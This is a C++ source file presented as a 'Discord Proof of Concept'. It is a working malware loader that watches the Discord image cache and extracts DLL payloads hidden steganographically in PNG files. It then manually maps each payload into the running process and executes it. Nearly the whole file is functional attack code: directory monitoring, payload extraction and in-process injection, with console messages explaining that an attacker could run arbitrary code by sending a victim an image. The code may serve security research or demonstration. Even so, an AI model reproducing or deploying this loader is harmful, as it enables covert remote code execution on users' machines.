#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <ShlObj.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <tchar.h>

#include "injection.h"
#include "steganography.h"

std::wstring getDiscordCachePath();
std::vector<std::string> getLatestDiscordCachedImages();



/**
	This is a hardcoded example how to execute a payload from a png
*/
void executePayloadExample()
{
	image_t image;
	if (!readPNG("detective.png", &image))
		return;

	uint8_t *dllBuffer = nullptr;
	int payloadLength = extractPayload(&image, &dllBuffer);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	ManualMap(hProc, dllBuffer);
	CloseHandle(hProc);
	system("pause");
}

std::wstring getDiscordCachePath()
{
	WCHAR *roamingPath;
	HRESULT hResult = SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &roamingPath);
	if (hResult != S_OK)
	{
		CoTaskMemFree(roamingPath);
		return nullptr;
	}

	std::wstring discordCachePath(roamingPath);
	discordCachePath += std::wstring(L"\\discord\\Cache\\");
	return discordCachePath;
}

std::vector<std::string> getLatestDiscordCachedImages()
{
	std::vector<std::string> cacheFiles;
	std::wstring discordCachePath = getDiscordCachePath();

	//Check if discord cache folder even exists, if not do nothing
	DWORD dwFileAttributes = GetFileAttributes(discordCachePath.c_str());
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES || !(dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		return cacheFiles;

	std::string prefix("f_");
	for (const auto &entry : std::filesystem::directory_iterator(discordCachePath))
	{
		std::string path = entry.path().string();
		if (path.find(prefix) != std::string::npos)
		{
			cacheFiles.push_back(path);
		}
	}

	return cacheFiles;
}


void watchDiscordCacheDirectory()
{
	std::wstring cachePath = getDiscordCachePath();
	HANDLE hCacheDir = CreateFile(
		cachePath.c_str(),
		FILE_LIST_DIRECTORY,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS,
		NULL
	);

	if (hCacheDir == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile failed. Error: 0x%X\n", GetLastError());
		return;
	}

	FILE_NOTIFY_INFORMATION fni[64];
	DWORD result;
	DWORD bytesRead;
	while ((result = ReadDirectoryChangesW(
		hCacheDir,
		&fni,
		sizeof(fni),
		FALSE,
		FILE_NOTIFY_CHANGE_FILE_NAME,
		&bytesRead,
		NULL,
		NULL
	)))
	{
		if (!result)
		{
			printf("ReadDirectoryChangesW failed. Error: 0x%X\n", GetLastError());
			return;
		}

		if (fni[0].Action == FILE_ACTION_ADDED)
		{
			if (!fni[0].FileName[0] == L'f')
			{
				printf("Skipping meta data file...\n");
				continue;
			}

			std::wstring cacheFileName(fni[0].FileName, 8);
			std::wstring fullPath(cachePath);
			fullPath += cacheFileName;
			

			//Todo: Find better way to convert to normal char *...
			std::string fullPathC(fullPath.begin(), fullPath.end());

			printf("Cache file was created: %s | isPNG: ", fullPathC.c_str());

			Sleep(500);

			image_t image;
			bool isPNGFile = readPNG(fullPathC.c_str(), &image);
			printf("%s", isPNGFile ? "Yes" : "No\n");

			if (!isPNGFile)
				continue;

			bool hasPayload = containsPayload(&image);
			printf(" | hasPayload: %s\n", hasPayload ? "Yes" : "No");

			if (!hasPayload)
				continue;

			printf("Executing payload!\n");

			uint8_t *dllBuffer = nullptr;
			int payloadLength = extractPayload(&image, &dllBuffer);
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
			ManualMap(hProc, dllBuffer);
			CloseHandle(hProc);
		}
		
	}

}



void loaderRoutine(HANDLE hConsole)
{
	std::vector<std::string> cacheFiles = getLatestDiscordCachedImages();

	
	for (int i = 0; i < cacheFiles.size(); i++)
	{
		image_t image;
		if (!readPNG(cacheFiles[i].c_str(), &image))
			continue;

		if (!containsPayload(&image))
			continue;

		SetConsoleTextAttribute(hConsole, 12);

		printf("Found hidden code in %s\n", cacheFiles[i].c_str());
		printf("Extracting and executing...\n");

		uint8_t *dllBuffer = nullptr;
		int payloadLength = extractPayload(&image, &dllBuffer);
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
		ManualMap(hProc, dllBuffer);
		CloseHandle(hProc);
		printf("Execution ended.\n");

		SetConsoleTextAttribute(hConsole, 15);
	}

}

//This is an alternative main that checks ALL cache files...
/*
int main()
{

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	printf("Discord Proof of Concept: Running code from cached image\n\n");

	SetConsoleTextAttribute(hConsole, 10);
	printf("Press any key to start countdown.\n");
	std::cin.get();

	SetConsoleTextAttribute(hConsole, 15);
	int countdown = 5;
	while (countdown >= 0)
	{
		printf("\rChecking your discord cache in: %s%d", countdown < 10 ? " " : "", countdown--);
		Sleep(1000);
	}
	
	printf("\nSearching...\n");
	loaderRoutine(hConsole);
	SetConsoleTextAttribute(hConsole, 15);
	printf("Nothing happened? No payload was found in recent images then...\n");
	system("pause");
	CloseHandle(hConsole);
	return 0;
}

*/

int main()
{

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 15);
	printf("Discord Proof of Concept: Running code from cached image\n\n");
	printf("This executable demonstrates what would be carried out\nsilently in the background by a real malware using this technique.\nEvery time discord makes a new cache entry,\nthe new file is checked for containing a payload.\nIf so it will be extracted and get manually mapped into this process and executed.\nIn a scenario where your pc would be running this as a service,\nan attacker could execute any additional code by sending you an image on discord.\n\n");
	SetConsoleTextAttribute(hConsole, 10);
	printf("Press any key to simulate a malicious service doing the above...\n");
	std::cin.get();
	
	SetConsoleTextAttribute(hConsole, 15);
	printf("Watching discord cache...\n");
	watchDiscordCacheDirectory();

	system("pause");
	CloseHandle(hConsole);
	return 0;
}
